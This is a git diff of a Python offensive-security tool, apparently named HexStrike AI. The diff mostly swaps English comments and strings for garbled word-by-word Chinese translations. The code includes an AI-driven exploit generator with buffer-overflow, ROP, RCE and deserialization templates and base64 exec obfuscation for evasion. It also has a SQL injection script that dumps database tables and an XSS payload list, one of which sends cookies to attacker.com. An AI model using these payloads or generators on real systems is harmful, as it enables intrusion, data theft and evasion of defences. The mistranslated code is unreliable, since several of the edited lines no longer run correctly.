                             'exploit-db.com': 'exploit-db',
                             'packetstormsecurity.com': 'packetstorm',
@@ -6551,18 +6551,18 @@ class CVEIntelligenceManager:
             except Exception as e:
                 logger.error(f" Exploit database search error: {str(e)}")
             
-            # 3. Search for Metasploit modules
+            # 3. Search 用于 Metasploit modules
             try:
                 logger.info(f" Searching for Metasploit modules for {cve_id}...")
                 
-                # Search GitHub for Metasploit modules containing the CVE
+                # Search GitHub 用于 Metasploit modules containing the CVE
                 msf_search_url = "https://api.github.com/search/code"
                 msf_params = {
                     'q': f'{cve_id} filename:*.rb repo:rapid7/metasploit-framework',
                     'per_page': 5
                 }
                 
-                time.sleep(1)  # Rate limiting
+                time.sleep(1)  # 说明：Rate limiting
                 msf_response = requests.get(msf_search_url, params=msf_params, timeout=15)
                 
                 if msf_response.status_code == 200:
@@ -6598,13 +6598,13 @@ class CVEIntelligenceManager:
             except requests.exceptions.RequestException as e:
                 logger.error(f" Metasploit search error: {str(e)}")
             
-            # Add default sources to searched list
+            # Add 默认 sources 到 searched 列出
             default_sources = ["exploit-db", "github", "metasploit", "packetstorm"]
             for source in default_sources:
                 if source not in sources_searched:
                     sources_searched.append(source)
             
-            # Sort exploits by reliability and date
+            # 排序 exploits 由 reliability 与 date
             reliability_order = {"EXCELLENT": 4, "GOOD": 3, "FAIR": 2, "UNVERIFIED": 1}
             all_exploits.sort(key=lambda x: (
                 reliability_order.get(x.get("reliability", "UNVERIFIED"), 0),
@@ -6639,9 +6639,9 @@ class CVEIntelligenceManager:
                 "sources_searched": []
             }
 
-# Configure enhanced logging with colors
+# 配置 增强日志 使用 colors
 class ColoredFormatter(logging.Formatter):
-    """Custom formatter with colors and emojis"""
+    """Custom formatter 使用 colors 与 emojis"""
 
     COLORS = {
         'DEBUG': ModernVisualEngine.COLORS['DEBUG'],
@@ -6663,21 +6663,21 @@ class ColoredFormatter(logging.Formatter):
         emoji = self.EMOJIS.get(record.levelname, '')
         color = self.COLORS.get(record.levelname, ModernVisualEngine.COLORS['BRIGHT_WHITE'])
 
-        # Add color and emoji to the message
+        # Add color 与 emoji 到 the message
         record.msg = f"{color}{emoji} {record.msg}{ModernVisualEngine.COLORS['RESET']}"
         return super().format(record)
 
-# Enhanced logging setup
+# 增强日志 初始化
 def setup_logging():
-    """Setup enhanced logging with colors and formatting"""
+    """初始化 增强日志 使用 colors 与 formatting"""
     logger = logging.getLogger()
     logger.setLevel(logging.INFO)
 
-    # Clear existing handlers
+    # 说明：Clear existing handlers
     for handler in logger.handlers[:]:
         logger.removeHandler(handler)
 
-    # Console handler with colors
+    # Console handler 使用 colors
     console_handler = logging.StreamHandler(sys.stdout)
     console_handler.setFormatter(ColoredFormatter(
         "[ HexStrike AI] %(asctime)s [%(levelname)s] %(message)s",
@@ -6687,14 +6687,14 @@ def setup_logging():
 
     return logger
 
-# Configuration (using existing API_PORT from top of file)
+# 配置 (using existing API_PORT 来自 top 的 文件)
 DEBUG_MODE = os.environ.get("DEBUG_MODE", "0").lower() in ("1", "true", "yes", "y")
-COMMAND_TIMEOUT = 300  # 5 minutes default timeout
+COMMAND_TIMEOUT = 300  # 5 minutes 默认 超时
 CACHE_SIZE = 1000
-CACHE_TTL = 3600  # 1 hour
+CACHE_TTL = 3600  # 说明：1 hour
 
 class HexStrikeCache:
-    """Advanced caching system for command results"""
+    """高级 caching 系统 用于 命令 结果"""
 
     def __init__(self, max_size: int = CACHE_SIZE, ttl: int = CACHE_TTL):
         self.cache = OrderedDict()
@@ -6703,28 +6703,28 @@ class HexStrikeCache:
         self.stats = {"hits": 0, "misses": 0, "evictions": 0}
 
     def _generate_key(self, command: str, params: Dict[str, Any]) -> str:
-        """Generate cache key from command and parameters"""
+        """生成 缓存 key 来自 命令 与 参数"""
         key_data = f"{command}:{json.dumps(params, sort_keys=True)}"
         return hashlib.md5(key_data.encode()).hexdigest()
 
     def _is_expired(self, timestamp: float) -> bool:
-        """Check if cache entry is expired"""
+        """检查 如果 缓存 入口 is expired"""
         return time.time() - timestamp > self.ttl
 
     def get(self, command: str, params: Dict[str, Any]) -> Optional[Dict[str, Any]]:
-        """Get cached result if available and not expired"""
+        """获取 cached 结果 如果 available 与 not expired"""
         key = self._generate_key(command, params)
 
         if key in self.cache:
             timestamp, data = self.cache[key]
             if not self._is_expired(timestamp):
-                # Move to end (most recently used)
+                # Move 到 end (most recently used)
                 self.cache.move_to_end(key)
                 self.stats["hits"] += 1
                 logger.info(f" Cache HIT for command: {command}")
                 return data
             else:
-                # Remove expired entry
+                # Remove expired 入口
                 del self.cache[key]
 
         self.stats["misses"] += 1
@@ -6732,10 +6732,10 @@ class HexStrikeCache:
         return None
 
     def set(self, command: str, params: Dict[str, Any], result: Dict[str, Any]):
-        """Store result in cache"""
+        """Store 结果 在 缓存"""
         key = self._generate_key(command, params)
 
-        # Remove oldest entries if cache is full
+        # Remove oldest entries 如果 缓存 is full
         while len(self.cache) >= self.max_size:
             oldest_key = next(iter(self.cache))
             del self.cache[oldest_key]
@@ -6745,7 +6745,7 @@ class HexStrikeCache:
         logger.info(f" Cached result for command: {command}")
 
     def get_stats(self) -> Dict[str, Any]:
-        """Get cache statistics"""
+        """获取 缓存 统计"""
         total_requests = self.stats["hits"] + self.stats["misses"]
         hit_rate = (self.stats["hits"] / total_requests * 100) if total_requests > 0 else 0
 
@@ -6758,11 +6758,11 @@ class HexStrikeCache:
             "evictions": self.stats["evictions"]
         }
 
-# Global cache instance
+# 全局 缓存 instance
 cache = HexStrikeCache()
 
 class TelemetryCollector:
-    """Collect and manage system telemetry"""
+    """收集 与 manage 系统 telemetry"""
 
     def __init__(self):
         self.stats = {
@@ -6774,7 +6774,7 @@ class TelemetryCollector:
         }
 
     def record_execution(self, success: bool, execution_time: float):
-        """Record command execution statistics"""
+        """Record 命令 execution 统计"""
         self.stats["commands_executed"] += 1
         if success:
             self.stats["successful_commands"] += 1
@@ -6783,7 +6783,7 @@ class TelemetryCollector:
         self.stats["total_execution_time"] += execution_time
 
     def get_system_metrics(self) -> Dict[str, Any]:
-        """Get current system metrics"""
+        """获取 current 系统 指标"""
         return {
             "cpu_percent": psutil.cpu_percent(interval=1),
             "memory_percent": psutil.virtual_memory().percent,
@@ -6792,7 +6792,7 @@ class TelemetryCollector:
         }
 
     def get_stats(self) -> Dict[str, Any]:
-        """Get telemetry statistics"""
+        """获取 telemetry 统计"""
         uptime = time.time() - self.stats["start_time"]
         success_rate = (self.stats["successful_commands"] / self.stats["commands_executed"] * 100) if self.stats["commands_executed"] > 0 else 0
         avg_execution_time = (self.stats["total_execution_time"] / self.stats["commands_executed"]) if self.stats["commands_executed"] > 0 else 0
@@ -6805,11 +6805,11 @@ class TelemetryCollector:
             "system_metrics": self.get_system_metrics()
         }
 
-# Global telemetry collector
+# 全局 telemetry collector
 telemetry = TelemetryCollector()
 
 class EnhancedCommandExecutor:
-    """Enhanced command executor with caching, progress tracking, and better output handling"""
+    """增强 命令 executor 使用 caching, progress tracking, 与 better 输出 handling"""
 
     def __init__(self, command: str, timeout: int = COMMAND_TIMEOUT):
         self.command = command
@@ -6825,30 +6825,30 @@ class EnhancedCommandExecutor:
         self.end_time = None
 
     def _read_stdout(self):
-        """Thread function to continuously read and display stdout"""
+        """Thread function 到 continuously read 与 展示 stdout"""
         try:
             for line in iter(self.process.stdout.readline, ''):
                 if line:
                     self.stdout_data += line
-                    # Real-time output display
+                    # Real-time 输出 展示
                     logger.info(f" STDOUT: {line.strip()}")
         except Exception as e:
             logger.error(f"Error reading stdout: {e}")
 
     def _read_stderr(self):
-        """Thread function to continuously read and display stderr"""
+        """Thread function 到 continuously read 与 展示 stderr"""
         try:
             for line in iter(self.process.stderr.readline, ''):
                 if line:
                     self.stderr_data += line
-                    # Real-time error output display
+                    # Real-time 错误 输出 展示
                     logger.warning(f" STDERR: {line.strip()}")
         except Exception as e:
             logger.error(f"Error reading stderr: {e}")
 
     def _show_progress(self, duration: float):
-        """Show enhanced progress indication for long-running commands"""
-        if duration > 2:  # Show progress for commands taking more than 2 seconds
+        """Show 增强 progress indication 用于 long-running 命令"""
+        if duration > 2:  # Show progress 用于 命令 taking more than 2 seconds
             progress_chars = ModernVisualEngine.PROGRESS_STYLES['dots']
             start = time.time()
             i = 0
@@ -6856,20 +6856,20 @@ class EnhancedCommandExecutor:
                 elapsed = time.time() - start
                 char = progress_chars[i % len(progress_chars)]
 
-                # Calculate progress percentage (rough estimate)
+                # 计算 progress percentage (rough estimate)
                 progress_percent = min((elapsed / self.timeout) * 100, 99.9)
                 progress_fraction = progress_percent / 100
 
-                # Calculate ETA
+                # 计算 ETA
                 eta = 0
-                if progress_percent > 5:  # Only show ETA after 5% progress
+                if progress_percent > 5:  # 仅 show ETA after 5% progress
                     eta = ((elapsed / progress_percent) * 100) - elapsed
 
-                # Calculate speed
+                # 计算 speed
                 bytes_processed = len(self.stdout_data) + len(self.stderr_data)
                 speed = f"{bytes_processed/elapsed:.0f} B/s" if elapsed > 0 else "0 B/s"
 
-                # Update process manager with progress
+                # 更新 进程 manager 使用 progress
                 ProcessManager.update_process_progress(
                     self.process.pid,
                     progress_fraction,
@@ -6877,7 +6877,7 @@ class EnhancedCommandExecutor:
                     bytes_processed
                 )
 
-                # Create beautiful progress bar using ModernVisualEngine
+                # 创建 beautiful progress bar using ModernVisualEngine
                 progress_bar = ModernVisualEngine.render_progress_bar(
                     progress_fraction,
                     width=30,
@@ -6894,7 +6894,7 @@ class EnhancedCommandExecutor:
                     break
 
     def execute(self) -> Dict[str, Any]:
-        """Execute the command with enhanced monitoring and output"""
+        """执行 the 命令 使用 增强 监控 与 输出"""
         self.start_time = time.time()
 
         logger.info(f" EXECUTING: {self.command}")
@@ -6913,10 +6913,10 @@ class EnhancedCommandExecutor:
             pid = self.process.pid
             logger.info(f" PROCESS: PID {pid} started")
 
-            # Register process with ProcessManager (v5.0 enhancement)
+            # Register 进程 使用 ProcessManager (v5.0 enhancement)
             ProcessManager.register_process(pid, self.command, self.process)
 
-            # Start threads to read output continuously
+            # Start threads 到 read 输出 continuously
             self.stdout_thread = threading.Thread(target=self._read_stdout)
             self.stderr_thread = threading.Thread(target=self._read_stderr)
             self.stdout_thread.daemon = True
@@ -6924,23 +6924,23 @@ class EnhancedCommandExecutor:
             self.stdout_thread.start()
             self.stderr_thread.start()
 
-            # Start progress tracking in a separate thread
+            # Start progress tracking 在 a separate thread
             progress_thread = threading.Thread(target=self._show_progress, args=(self.timeout,))
             progress_thread.daemon = True
             progress_thread.start()
 
-            # Wait for the process to complete or timeout
+            # Wait 用于 the 进程 到 complete 或 超时
             try:
                 self.return_code = self.process.wait(timeout=self.timeout)
                 self.end_time = time.time()
 
-                # Process completed, join the threads
+                # 进程 completed, join the threads
                 self.stdout_thread.join(timeout=1)
                 self.stderr_thread.join(timeout=1)
 
                 execution_time = self.end_time - self.start_time
 
-                # Cleanup process from registry (v5.0 enhancement)
+                # Cleanup 进程 来自 registry (v5.0 enhancement)
                 ProcessManager.cleanup_process(pid)
 
                 if self.return_code == 0:
@@ -6954,35 +6954,35 @@ class EnhancedCommandExecutor:
                 self.end_time = time.time()
                 execution_time = self.end_time - self.start_time
 
-                # Process timed out but we might have partial results
+                # 进程 timed out but we might have partial 结果
                 self.timed_out = True
                 logger.warning(f" TIMEOUT: Command timed out after {self.timeout}s | Terminating PID {self.process.pid}")
 
-                # Try to terminate gracefully first
+                # Try 到 terminate gracefully 第一
                 self.process.terminate()
                 try:
                     self.process.wait(timeout=5)
                 except subprocess.TimeoutExpired:
-                    # Force kill if it doesn't terminate
+                    # Force kill 如果 it doesn't terminate
                     logger.error(f" FORCE KILL: Process {self.process.pid} not responding to termination")
                     self.process.kill()
 
                 self.return_code = -1
                 telemetry.record_execution(False, execution_time)
 
-            # Always consider it a success if we have output, even with timeout
+            # Always consider it a 成功 如果 we have 输出, even 使用 超时
             success = True if self.timed_out and (self.stdout_data or self.stderr_data) else (self.return_code == 0)
 
-            # Log enhanced final results with summary using ModernVisualEngine
+            # Log 增强 final 结果 使用 summary using ModernVisualEngine
             output_size = len(self.stdout_data) + len(self.stderr_data)
             execution_time = self.end_time - self.start_time if self.end_time else 0
 
-            # Create status summary
+            # 创建 状态 summary
             status_icon = "" if success else ""
             status_color = ModernVisualEngine.COLORS['MATRIX_GREEN'] if success else ModernVisualEngine.COLORS['HACKER_RED']
             timeout_status = f" {ModernVisualEngine.COLORS['WARNING']}[TIMEOUT]{ModernVisualEngine.COLORS['RESET']}" if self.timed_out else ""
 
-            # Create beautiful results summary
+            # 创建 beautiful 结果 summary
             results_summary = f"""
 {ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╭─────────────────────────────────────────────────────────────────────────────╮{ModernVisualEngine.COLORS['RESET']}
 {ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {status_color} FINAL RESULTS {status_icon}{ModernVisualEngine.COLORS['RESET']}
@@ -6995,7 +6995,7 @@ class EnhancedCommandExecutor:
 {ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╰─────────────────────────────────────────────────────────────────────────────╯{ModernVisualEngine.COLORS['RESET']}
 """
 
-            # Log the beautiful summary
+            # 说明：Log the beautiful summary
             for line in results_summary.strip().split('\n'):
                 if line.strip():
                     logger.info(line)
@@ -7031,53 +7031,53 @@ class EnhancedCommandExecutor:
             }
 
 # ============================================================================
-# DUPLICATE CLASSES REMOVED - Using the first definitions above
+# DUPLICATE CLASSES REMOVED - Using the 第一 definitions above
 # ============================================================================
 
 # ============================================================================
-# AI-POWERED EXPLOIT GENERATION SYSTEM (v6.0 ENHANCEMENT)
+# AI-POWERED 利用 GENERATION 系统 (v6.0 ENHANCEMENT)
 # ============================================================================
 #
-# This section contains advanced AI-powered exploit generation capabilities
-# for automated vulnerability exploitation and proof-of-concept development.
+# This section contains 高级 AI-powered 利用 generation capabilities
+# 用于 automated 漏洞 exploitation 与 proof-of-concept development.
 #
-# Features:
-# - Automated exploit template generation from CVE data
-# - Multi-architecture support (x86, x64, ARM)
-# - Evasion technique integration
-# - Custom payload generation
-# - Exploit effectiveness scoring
+# 说明：Features:
+# - Automated 利用 template generation 来自 CVE data
+# 说明：- Multi-architecture support (x86, x64, ARM)
+# 说明：- Evasion technique integration
+# - Custom 载荷 generation
+# - 利用 effectiveness scoring
 #
 # ============================================================================
 
 
 
 class AIExploitGenerator:
-    """AI-powered exploit development and enhancement system"""
+    """AI-powered 利用 development 与 enhancement 系统"""
 
     def __init__(self):
-        # Extend existing payload templates
+        # Extend existing 载荷 templates
         self.exploit_templates = {
             "buffer_overflow": {
                 "x86": """
-# Buffer Overflow Exploit Template for {cve_id}
-# Target: {target_info}
-# Architecture: x86
+# 缓冲区 溢出 利用 模板 用于 {cve_id}
+# 目标: {target_info}
+# 架构: x86
 
 import struct
 import socket
 
 def create_exploit():
-    # Vulnerability details from {cve_id}
+    # 漏洞 详情 来源 {cve_id}
     target_ip = "{target_ip}"
     target_port = {target_port}
 
-    # Buffer overflow payload
+    # 缓冲区 溢出 载荷
     padding = "A" * {offset}
     eip_control = struct.pack("<I", {ret_address})
     nop_sled = "\\x90" * {nop_size}
 
-    # Shellcode ({shellcode_type})
+    # 说明：Shellcode ({shellcode_type})
     shellcode = {shellcode}
 
     exploit = padding + eip_control + nop_sled + shellcode
@@ -7085,13 +7085,13 @@ def create_exploit():
 
 if __name__ == "__main__":
     payload = create_exploit()
-    print(f"Exploit payload generated for {cve_id}")
-    print(f"Payload size: {{len(payload)}} bytes")
+    print(f"已生成利用载荷，目标：{cve_id}")
+    print(f"载荷大小：{{len(payload)}}字节")
                 """,
                 "x64": """
-# 64-bit Buffer Overflow Exploit Template for {cve_id}
-# Target: {target_info}
-# Architecture: x64
+# 64-bit 缓冲区 溢出 利用 模板 用于 {cve_id}
+# 目标: {target_info}
+# 架构: x64
 
 import struct
 import socket
@@ -7100,7 +7100,7 @@ def create_rop_exploit():
     target_ip = "{target_ip}"
     target_port = {target_port}
 
-    # ROP chain for x64 exploitation
+    # ROP 链 用于 x64 exploitation
     padding = "A" * {offset}
     rop_chain = [
         {rop_gadgets}
@@ -7114,20 +7114,20 @@ def create_rop_exploit():
                 """
             },
             "web_rce": """
-# Web-based RCE Exploit for {cve_id}
-# Target: {target_info}
+# Web-based RCE 利用 用于 {cve_id}
+# 目标: {target_info}
 
 import requests
 import sys
 
 def exploit_rce(target_url, command):
-    # CVE {cve_id} exploitation
+    # 说明：CVE {cve_id} exploitation
     headers = {{
         "User-Agent": "Mozilla/5.0 (Compatible Exploit)",
         "Content-Type": "{content_type}"
     }}
 
-    # Injection payload
+    # 注入 载荷
     payload = {injection_payload}
 
     try:
@@ -7135,23 +7135,23 @@ def exploit_rce(target_url, command):
         if response.status_code == 200:
             return response.text
     except Exception as e:
-        print(f"Exploit failed: {{e}}")
+        print(f"利用失败：{{e}}")
 
     return None
 
 if __name__ == "__main__":
     if len(sys.argv) != 3:
-        print("Usage: python exploit.py <target_url> <command>")
+        print("用法： python exploit.py<target_url><command>")
         sys.exit(1)
 
     result = exploit_rce(sys.argv[1], sys.argv[2])
     if result:
-        print("Exploit successful!")
-        print(result)
+        print("利用 成功!")
+        print(f"结果：{result}")
             """,
             "deserialization": """
-# Deserialization Exploit for {cve_id}
-# Target: {target_info}
+# 反序列化 利用 用于 {cve_id}
+# 目标: {target_info}
 
 import pickle
 import base64
@@ -7187,17 +7187,17 @@ def send_exploit(target_url, command):
         }
 
     def generate_exploit_from_cve(self, cve_data, target_info):
-        """Generate working exploit from real CVE data with specific implementation"""
+        """生成 working 利用 来自 real CVE data 使用 specific implementation"""
         try:
             cve_id = cve_data.get("cve_id", "")
             description = cve_data.get("description", "").lower()
             
             logger.info(f" Generating specific exploit for {cve_id}")
 
-            # Enhanced vulnerability classification using real CVE data
+            # 增强 漏洞 classification using real CVE data
             vuln_type, specific_details = self._analyze_vulnerability_details(description, cve_data)
             
-            # Generate real, specific exploit based on CVE details
+            # 生成 real, specific 利用 based 在 CVE details
             if vuln_type == "sql_injection":
                 exploit_code = self._generate_sql_injection_exploit(cve_data, target_info, specific_details)
             elif vuln_type == "xss":
@@ -7215,14 +7215,14 @@ def send_exploit(target_url, command):
             elif vuln_type == "buffer_overflow":
                 exploit_code = self._generate_buffer_overflow_exploit(cve_data, target_info, specific_details)
             else:
-                # Fallback to intelligent generic exploit
+                # 降级 到 智能 generic 利用
                 exploit_code = self._generate_intelligent_generic_exploit(cve_data, target_info, specific_details)
 
-            # Apply evasion techniques if requested
+            # Apply evasion techniques 如果 requested
             if target_info.get("evasion_level", "none") != "none":
                 exploit_code = self._apply_evasion_techniques(exploit_code, target_info)
 
-            # Generate specific usage instructions
+            # 生成 specific usage instructions
             instructions = self._generate_specific_instructions(vuln_type, cve_data, target_info, specific_details)
 
             return {
@@ -7241,7 +7241,7 @@ def send_exploit(target_url, command):
             return {"success": False, "error": str(e)}
 
     def _classify_vulnerability(self, description):
-        """Classify vulnerability type from description"""
+        """Classify 漏洞 类型 来自 description"""
         if any(keyword in description for keyword in ["buffer overflow", "heap overflow", "stack overflow"]):
             return "buffer_overflow"
         elif any(keyword in description for keyword in ["code execution", "command injection", "rce"]):
@@ -7256,7 +7256,7 @@ def send_exploit(target_url, command):
             return "generic"
 
     def _select_template(self, vuln_type, target_info):
-        """Select appropriate exploit template"""
+        """选择 appropriate 利用 template"""
         if vuln_type == "buffer_overflow":
             arch = target_info.get("target_arch", "x86")
             return self.exploit_templates["buffer_overflow"].get(arch,
@@ -7267,7 +7267,7 @@ def send_exploit(target_url, command):
             return "# Generic exploit template for {cve_id}\n# Manual development required"
 
     def _generate_exploit_parameters(self, cve_data, target_info, vuln_type):
-        """Generate parameters for exploit template"""
+        """生成 参数 用于 利用 template"""
         params = {
             "cve_id": cve_data.get("cve_id", ""),
             "target_info": target_info.get("description", "Unknown target"),
@@ -7295,32 +7295,32 @@ def send_exploit(target_url, command):
         return params
 
     def _apply_evasion_techniques(self, exploit_code, target_info):
-        """Apply evasion techniques to exploit code"""
+        """Apply evasion techniques 到 利用 code"""
         evasion_level = target_info.get("evasion_level", "basic")
 
         if evasion_level == "basic":
-            # Simple string obfuscation
+            # 简单 string obfuscation
             exploit_code = exploit_code.replace('"', "'")
             exploit_code = f"# Obfuscated exploit\n{exploit_code}"
         elif evasion_level == "advanced":
-            # Advanced obfuscation
+            # 高级 obfuscation
             exploit_code = self._advanced_obfuscation(exploit_code)
 
         return exploit_code
 
     def _advanced_obfuscation(self, code):
-        """Apply advanced obfuscation techniques"""
-        # This is a simplified version - real implementation would be more sophisticated
+        """Apply 高级 obfuscation techniques"""
+        # 说明：This is a simplified version - real implementation would be more sophisticated
         obfuscated = f"""
-# Advanced evasion techniques applied
+# 高级 绕过 技术 已应用
 import base64
 exec(base64.b64decode('{base64.b64encode(code.encode()).decode()}'))
         """
         return obfuscated
 
     def _analyze_vulnerability_details(self, description, cve_data):
-        """Analyze CVE data to extract specific vulnerability details"""
-        import re  # Import at the top of the method
+        """分析 CVE data 到 extract specific 漏洞 details"""
+        import re  # Import at the top 的 the method
         
         vuln_type = "generic"
         specific_details = {
@@ -7332,25 +7332,25 @@ exec(base64.b64decode('{base64.b64encode(code.encode()).decode()}'))
             "attack_vector": "unknown"
         }
         
-        # Extract specific details from description
+        # Extract specific details 来自 description
         description_lower = description.lower()
         
-        # SQL Injection detection and details
+        # SQL Injection detection 与 details
         if any(keyword in description_lower for keyword in ["sql injection", "sqli"]):
             vuln_type = "sql_injection"
-            # Extract endpoint from description
+            # Extract 端点 来自 description
             endpoint_match = re.search(r'(/[^\s]+\.php[^\s]*)', description)
             if endpoint_match:
                 specific_details["endpoints"] = [endpoint_match.group(1)]
-            # Extract parameter names
+            # Extract 参数 names
             param_matches = re.findall(r'(?:via|parameter|param)\s+([a-zA-Z_][a-zA-Z0-9_]*)', description)
             if param_matches:
                 specific_details["parameters"] = param_matches
                 
-        # XSS detection
+        # 说明：XSS detection
         elif any(keyword in description_lower for keyword in ["cross-site scripting", "xss"]):
             vuln_type = "xss"
-            # Extract XSS context
+            # 说明：Extract XSS context
             if "stored" in description_lower:
                 specific_details["xss_type"] = "stored"
             elif "reflected" in description_lower:
@@ -7358,12 +7358,12 @@ exec(base64.b64decode('{base64.b64encode(code.encode()).decode()}'))
             else:
                 specific_details["xss_type"] = "unknown"
                 
-        # XXE detection
+        # 说明：XXE detection
         elif any(keyword in description_lower for keyword in ["xxe", "xml external entity"]):
             vuln_type = "xxe"
             specific_details["payload_location"] = "xml"
             
-        # File read/traversal detection
+        # 文件 read/traversal detection
         elif any(keyword in description_lower for keyword in ["file read", "directory traversal", "path traversal", "arbitrary file", "file disclosure", "local file inclusion", "lfi", "file inclusion"]):
             vuln_type = "file_read"
             if "directory traversal" in description_lower or "path traversal" in description_lower:
@@ -7373,28 +7373,28 @@ exec(base64.b64decode('{base64.b64encode(code.encode()).decode()}'))
             else:
                 specific_details["traversal_type"] = "file_read"
             
-            # Extract parameter names for LFI
+            # Extract 参数 names 用于 LFI
             param_matches = re.findall(r'(?:via|parameter|param)\s+([a-zA-Z_][a-zA-Z0-9_]*)', description)
             if param_matches:
                 specific_details["parameters"] = param_matches
                 
-        # Authentication bypass
+        # 认证 bypass
         elif any(keyword in description_lower for keyword in ["authentication bypass", "auth bypass", "login bypass"]):
             vuln_type = "authentication_bypass"
             
-        # RCE detection
+        # 说明：RCE detection
         elif any(keyword in description_lower for keyword in ["remote code execution", "rce", "command injection"]):
             vuln_type = "rce"
             
-        # Deserialization
+        # 说明：Deserialization
         elif any(keyword in description_lower for keyword in ["deserialization", "unserialize", "pickle"]):
             vuln_type = "deserialization"
             
-        # Buffer overflow
+        # 说明：Buffer overflow
         elif any(keyword in description_lower for keyword in ["buffer overflow", "heap overflow", "stack overflow"]):
             vuln_type = "buffer_overflow"
             
-        # Extract software and version info
+        # Extract software 与 version info
         software_match = re.search(r'(\w+(?:\s+\w+)*)\s+v?(\d+(?:\.\d+)*)', description)
         if software_match:
             specific_details["software"] = software_match.group(1)
@@ -7403,15 +7403,15 @@ exec(base64.b64decode('{base64.b64encode(code.encode()).decode()}'))
         return vuln_type, specific_details
 
     def _generate_sql_injection_exploit(self, cve_data, target_info, details):
-        """Generate specific SQL injection exploit based on CVE details"""
+        """生成 specific SQL injection 利用 based 在 CVE details"""
         cve_id = cve_data.get("cve_id", "")
         endpoint = details.get("endpoints", ["/vulnerable.php"])[0] if details.get("endpoints") else "/vulnerable.php"
         parameter = details.get("parameters", ["id"])[0] if details.get("parameters") else "id"
         
         return f'''#!/usr/bin/env python3
-# SQL Injection Exploit for {cve_id}
-# Vulnerability: {cve_data.get("description", "")[:100]}...
-# Target: {details.get("software", "Unknown")} {details.get("version", "")}
+# SQL 注入 利用 用于 {cve_id}
+# 漏洞: {cve_data.get("描述", "")[:100]}...
+# 目标: {详情.get("软件", "Unknown")} {详情.get("版本", "")}
 
 import requests
 import sys
@@ -7427,9 +7427,9 @@ class SQLiExploit:
         
     def test_injection(self):
         """Test if target is vulnerable"""
-        print(f"[+] Testing SQL injection on {{self.target_url}}{{self.endpoint}}")
+        print(f"[+] 正在测试 SQL 注入 在{{self.target_url}}{{self.endpoint}}")
         
-        # Time-based blind SQL injection test
+        # Time-based 盲 SQL 注入 测试
         payloads = [
             "1' AND SLEEP(3)--",
             "1' OR SLEEP(3)--",
@@ -7447,11 +7447,11 @@ class SQLiExploit:
                 elapsed = time.time() - start_time
                 
                 if elapsed >= 3:
-                    print(f"[+] Vulnerable! Payload: {{payload}}")
+                    print(f"[+] 存在漏洞！ 载荷:{{payload}}")
                     return True
                     
             except requests.exceptions.Timeout:
-                print(f"[+] Likely vulnerable (timeout): {{payload}}")
+                print(f"[+] 疑似存在漏洞 (超时):{{payload}}")
                 return True
             except Exception as e:
                 continue
@@ -7460,7 +7460,7 @@ class SQLiExploit:
     
     def extract_database_info(self):
         """Extract database information"""
-        print("[+] Extracting database information...")
+        print("[+] 正在提取 数据库 信息...")
         
         queries = {{
             "version": "SELECT VERSION()",
@@ -7478,21 +7478,21 @@ class SQLiExploit:
                     params={{self.parameter: payload}}
                 )
                 
-                # Simple extraction (would need customization per application)
+                # 简单 提取 (would need customization per application)
                 if response.status_code == 200:
                     results[info_type] = "Check response manually"
-                    print(f"[+] {{info_type.title()}}: Check response for {{query}}")
+                    print(f"[+]{{info_type.title()}}: 检查 响应 用于{{query}}")
                     
             except Exception as e:
-                print(f"[-] Error extracting {{info_type}}: {{e}}")
+                print(f"[-] 错误 提取{{info_type}}:{{e}}")
                 
         return results
     
     def dump_tables(self):
         """Dump table names"""
-        print("[+] Attempting to dump table names...")
+        print("[+] 正在尝试 到 导出 表 名称...")
         
-        # MySQL/MariaDB
+        # 说明：MySQL/MariaDB
         payload = "1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--"
         
         try:
@@ -7502,46 +7502,46 @@ class SQLiExploit:
             )
             
             if response.status_code == 200:
-                print("[+] Tables dumped - check response")
+                print("[+] 表 已导出 - 检查 响应")
                 return response.text
                 
         except Exception as e:
-            print(f"[-] Error dumping tables: {{e}}")
+            print(f"[-] 错误 导出 表:{{e}}")
             
         return None
 
 def main():
     if len(sys.argv) != 2:
-        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
-        print(f"Example: python3 {{sys.argv[0]}} http://target.com")
+        print(f"用法： python3{{sys.argv[0]}}<target_url>")
+        print(f"示例： python3{{sys.argv[0]}}http://目标.com")
         sys.exit(1)
     
     target_url = sys.argv[1]
     exploit = SQLiExploit(target_url)
     
-    print(f"[+] SQL Injection Exploit for {cve_id}")
-    print(f"[+] Target: {{target_url}}")
+    print(f"[+] SQL 注入 利用 用于{cve_id}")
+    print(f"[+] 目标：{{target_url}}")
     
     if exploit.test_injection():
-        print("[+] Target appears vulnerable!")
+        print("[+] 目标疑似存在漏洞!")
         exploit.extract_database_info()
         exploit.dump_tables()
     else:
-        print("[-] Target does not appear vulnerable")
+        print("[-] 目标不符合预期漏洞特征 存在漏洞")
 
 if __name__ == "__main__":
     main()
 '''
 
     def _generate_xss_exploit(self, cve_data, target_info, details):
-        """Generate specific XSS exploit based on CVE details"""
+        """生成 specific XSS 利用 based 在 CVE details"""
         cve_id = cve_data.get("cve_id", "")
         xss_type = details.get("xss_type", "reflected")
         
         return f'''#!/usr/bin/env python3
-# Cross-Site Scripting (XSS) Exploit for {cve_id}
-# Type: {xss_type.title()} XSS
-# Vulnerability: {cve_data.get("description", "")[:100]}...
+# Cross-Site 脚本 (XSS) 利用 用于 {cve_id}
+# 类型: {xss_type.title()} XSS
+# 漏洞: {cve_data.get("描述", "")[:100]}...
 
 import requests
 import sys
@@ -7555,17 +7555,17 @@ class XSSExploit:
     def generate_payloads(self):
         """Generate XSS payloads for testing"""
         payloads = [
-            # Basic XSS
+            # 基础 XSS
             "<script>alert('XSS-{cve_id}')</script>",
             "<img src=x onerror=alert('XSS-{cve_id}')>",
             "<svg onload=alert('XSS-{cve_id}')>",
             
-            # Bypass attempts
+            # 绕过 尝试
             "<script>alert(String.fromCharCode(88,83,83))</script>",
             "javascript:alert('XSS-{cve_id}')",
             "<iframe src=javascript:alert('XSS-{cve_id}')></iframe>",
             
-            # Advanced payloads
+            # 高级 payloads
             "<script>fetch('/admin').then(r=>r.text()).then(d=>alert(d.substr(0,100)))</script>",
             "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
         ]
@@ -7574,7 +7574,7 @@ class XSSExploit:
     
     def test_reflected_xss(self, parameter="q"):
         """Test for reflected XSS"""
